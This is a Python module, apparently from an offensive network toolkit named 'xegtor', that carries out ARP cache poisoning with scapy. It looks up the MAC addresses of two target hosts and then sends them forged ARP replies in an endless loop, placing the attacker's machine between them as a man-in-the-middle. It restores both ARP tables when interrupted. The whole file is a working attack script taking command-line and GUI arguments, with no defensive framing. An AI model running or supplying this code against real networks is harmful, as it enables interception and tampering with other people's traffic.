#!/usr/bin/env python3

'''
this script performs ARP cache poisoning attack
'''

from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
from argparse import ArgumentParser
from modules.logger import Logger

log_file_path = 'logs/xegtor.log'
logger = Logger(log_file=log_file_path ,filemode='a')

# class for arp spoof attack
class ArpSpoof:

    def __init__(self ,local_interface ,target1_ip ,target2_ip):
        self.local_interface = local_interface # interface using in the attack
        self.interface_mac = None
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.target1_mac = None
        self.target2_mac = None

    def start(self):
        '''function to start attack'''
        logger.add_log_delimiter()
        logger.add_log_path()
        logger.add_script_name('arp_spoof.py')
        logger.add_time()

        interface_header_msg = 'Interface : ' + self.local_interface
        print(interface_header_msg)
        logger.log(interface_header_msg)
        self.get_local_mac() # get interface mac address

        # print mac address if the interface name is correct
        interface_mac_msg = 'Interface mac : ' + self.interface_mac
        print(interface_mac_msg)
        logger.log(interface_mac_msg)

        self.get_targets_mac() # get targets mac addresses
        # print targets information
        target1_ip_msg = 'Target 1 : ' + self.target1_ip
        print(target1_ip_msg)
        logger.log(target1_ip_msg)

        target1_mac_msg = 'Target 1\'s mac : ' + self.target1_mac
        print(target1_mac_msg)
        logger.log(target1_mac_msg)

        target2_ip_msg = 'Target 2 : ' + self.target2_ip
        print(target2_ip_msg)
        logger.log(target2_ip_msg)

        target2_mac_msg = 'Target 2\'s mac : ' + self.target2_mac
        print(target2_mac_msg)
        logger.log(target2_mac_msg)

        self.poison_arp_cache()

    def get_local_mac(self):
        '''get interface mac from name of the interface'''

        try:
            self.interface_mac = get_if_hwaddr(self.local_interface)
        except ValueError :
            error_msg = 'error : Invalid interface name --> ' + self.local_interface
            print(error_msg)
            logger.log(error_msg)
            exit()
        except OSError :
            error_msg = 'error : Invalid interface name --> ' + self.local_interface
            print(error_msg)
            logger.log(error_msg)
            exit()

    def get_targets_mac(self):
        '''get targets mac by their ip address'''

        # get target 1 mac address
        try:
            self.target1_mac = getmacbyip(self.target1_ip)
            if self.target1_mac == None : # check if machine exists or responds to ARP request
                not_responding_arp_req_msg = 'Target ' + self.target1_ip + ' didn\'t respond tp ARP request sent by machine'
                print(not_responding_arp_req_msg)
                logger.log(not_responding_arp_req_msg)
                exit()

        except OSError :
            # ip validation
            invalid_ip_msg = 'Invalid IP address --> ' + self.target1_ip
            print(invalid_ip_msg)
            logger.log(invalid_ip_msg)
            exit()

        # get target 2 mac address
        try:
            self.target2_mac = getmacbyip(self.target2_ip)
            if self.target2_mac == None: # check if machine exists or responds to ARP request
                not_responding_arp_req_msg = 'Target ' + self.target2_ip + ' didn\'t respond tp ARP request sent by machine'
                print(not_responding_arp_req_msg)
                logger.log(not_responding_arp_req_msg)
                exit()

        except OSError :
            # ip validation
            invalid_ip_msg = 'Invalid IP address --> ' + self.target2_ip
            print(invalid_ip_msg)
            logger.log(invalid_ip_msg)
            exit()

    def poison_arp_cache(self):
        '''start poisoning the targets ARP caches'''

        while True :
            try :
                spoofed_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac ,hwsrc=self.interface_mac) # spoof target 1
                send(spoofed_arp_packet_target1 ,verbose=0)
                send_arp_packet1_msg = '[ARP : ' + self.target1_ip + ' --> ' + self.target2_ip + ']--> mac : ' + self.interface_mac
                print(send_arp_packet1_msg)
                logger.log(send_arp_packet1_msg)

                spoofed_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.interface_mac)  # spoof target 2
                send(spoofed_arp_packet_target2 ,verbose=0)
                send_arp_packet2_msg = '[ARP : ' + self.target2_ip + ' --> ' + self.target1_ip + ']--> mac : ' + self.interface_mac
                print(send_arp_packet2_msg)
                logger.log(send_arp_packet2_msg)

            except KeyboardInterrupt :
                self.restore_arp_spoof()
                exit()

    def restore_arp_spoof(self):
        '''restore arp tables of the target machines'''

        print('\n')
        arp_restore_packet_msg = '[Send last 2 ARP packets for restoring targets ARP tables] --> 5 times'
        print(arp_restore_packet_msg)
        logger.log(arp_restore_packet_msg)

        arp_restore_packets = 5 # for sending 2 packets 5 times -> 2*5
        num = 0
        try:
            while arp_restore_packets != num :
                num += 1
                correct_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac, hwsrc=self.target1_mac) # restore mac table of target 2
                correct_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.target2_mac) # restore mac table of target 1

                send(correct_arp_packet_target1 ,verbose=0)
                send(correct_arp_packet_target2 ,verbose=0)
        except:
            error_msg = 'ARP cache restore failed !'
            print(error_msg)
            logger.log(error_msg)
            exit()
        else:
            attack_finish_msg = 'The attack has finished.'
            print(attack_finish_msg)
            logger.log(attack_finish_msg)
            exit()

    def __del__(self):
        # when attack is finished add a log delimiter into log file
        logger.add_log_delimiter()

def run_from_gui(argument_values):
    arp_spoof = ArpSpoof(local_interface=argument_values['interface'] ,target1_ip=argument_values['target1'] ,target2_ip=argument_values['target2'] )
    arp_spoof.start()

def print_parser_help():
    help_text = '''
    optional arguments:
  --script-help, -sh  Show This Help Message And Exit
  --interface               Interface Using In Attack *
  --target1                 First Target For Attack *
  --target2                 Second Target For Attack *
    '''
    print(help_text)

def main():
    # define parser and its arguments
    parser = ArgumentParser(usage='sudo python3 %(prog)s --script arp_spoof.py [--script-help or -sh for help] [--interface INTERFACE] [--target1 TARGET 1] [--target2 TARGET 2]',allow_abbrev=False)

    parser.add_argument('--script-help','-sh',help='Show Script Help',action='store_true')
    parser.add_argument('--interface',help='Interface Using In Attack',metavar='')
    parser.add_argument('--target1',help='First Target For Attack',metavar='')
    parser.add_argument('--target2',help='Second Target For Attack',metavar='')
    args ,unknown = parser.parse_known_args()

    if ((args.script_help is not None) and (args.script_help is True)):
        print_parser_help()

    if (args.target1 != None) and (args.target2 != None) and (args.interface != None): # check arguments
        pass
    else:
        parser.print_usage() # print parser help
        exit()


    arp_spoof = ArpSpoof(args.interface ,args.target1 ,args.target2) # make an instance from ArpSpoof class
    arp_spoof.start() # start attack